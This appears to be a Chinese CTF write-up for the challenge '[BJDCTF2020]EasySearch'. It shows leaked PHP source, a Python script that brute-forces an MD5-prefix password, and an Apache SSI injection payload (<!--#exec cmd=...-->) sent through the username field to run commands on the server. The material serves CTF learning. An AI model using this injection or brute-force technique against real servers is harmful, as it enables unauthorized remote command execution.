## [BJDCTF2020]EasySearch

打开题目，没什么思路，我们就使用`dirsearch`扫一下目录

发现了 `index.php.swp` 里面存在源码：

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

分析一下，很明显，我们首先需要获得密码，密码md5加密后前六位为：`6d0bc1`

我们可以爆破得出密码，使用python脚本：

```python
import hashlib
admin = "6d0bc1"
for i in range(10000000):
    passwd = hashlib.md5(str(i).encode('utf-8')).hexdigest()[:6]
    if admin == passwd:
        print(i)
        
 输出：
2020666
```

所以我们就知道密码为：2020666

但是这里我们怎么才能得到flag呢？这里会将用户名给传入文件中，但是并不是普通的文件，而是`.shtml` 文件

这里有个知识点，`Apache SSI远程命令执行漏洞`

> SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。
>
> SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
>
> 从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。

意思就是，如果服务器端开启了SSI功能，我们可以通过相关的SSI写法(写在html注释中)将命令代码写入shtml文件中，然后代码执行的话就可以进行命令执行了

我们可以使用exec命令查询flag所在位置

```
<!--#exec cmd="ls ../"-->
```

当我们username:

```
<!--#exec cmd="ls ../"-->
```

返回url：

```
public/653573535b44403d59e8971929e98dc2ab4dd611.shtml
```

我们访问它

![image-20230315225754176](https://s2.loli.net/2023/03/15/VBnPGkJD1OwtqHK.png)

flag就在这个文件里面





